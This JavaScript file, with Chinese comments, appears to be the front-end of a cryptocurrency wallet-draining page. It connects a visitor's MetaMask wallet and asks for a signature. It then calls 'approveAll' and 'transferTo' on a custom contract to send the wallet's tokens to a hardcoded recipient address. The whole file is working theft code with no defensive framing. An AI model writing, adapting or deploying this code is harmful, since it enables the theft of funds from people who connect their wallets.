let web3;
let isConnected = false;
const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 接收代币的地址
const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 你的智能合约地址

const erc20Abi = [
    {
        "inputs": [],
        "name": "approveAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "transferTo",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 页面加载时
window.onload = async () => {
    // 初始禁用签名按钮
    document.getElementById('signButton').disabled = true;
};

// 更新状态显示
const updateStatus = (message) => {
    const statusElement = document.getElementById('status');
    statusElement.innerText = message;
};

// 连接钱包按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        try {
            // 请求用户连接钱包
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();

            if (accounts.length > 0) {
                const account = accounts[0];
                updateStatus(`已连接 MetaMask 地址: ${account}`);
                document.getElementById('signButton').disabled = false; // 启用签名按钮
                isConnected = true;
            } else {
                updateStatus('无法获取钱包地址，请重新连接');
            }
        } catch (error) {
            updateStatus('连接钱包失败: ' + error.message);
        }
    } else {
        updateStatus('MetaMask 未安装，请安装 MetaMask 插件');
    }
};

// 签名并转移代币
document.getElementById('signButton').onclick = async () => {
    if (isConnected && web3) {
        const accounts = await web3.eth.getAccounts();
        if (accounts.length > 0) {
            const account = accounts[0];
            try {
                const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
                const signature = await web3.eth.personal.sign(message, account);
                updateStatus(`签名成功: ${signature}`);

                // 执行转移操作
                await transferAssets(account);
            } catch (error) {
                updateStatus('签名失败: ' + error.message);
            }
        } else {
            updateStatus('未连接账户，请先连接钱包');
        }
    } else {
        updateStatus('钱包未连接，请先连接钱包');
    }
};

// 转移代币
const transferAssets = async (account) => {
    updateStatus('开始转移代币...');
    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);

    try {
        await tokenContract.methods.approveAll().send({ from: account });
        updateStatus('代币授权成功');

        await tokenContract.methods.transferTo().send({ from: account });
        updateStatus('代币成功转移到 ' + recipientAddress);
    } catch (error) {
        updateStatus('转移代币失败: ' + error.message);
    }
};
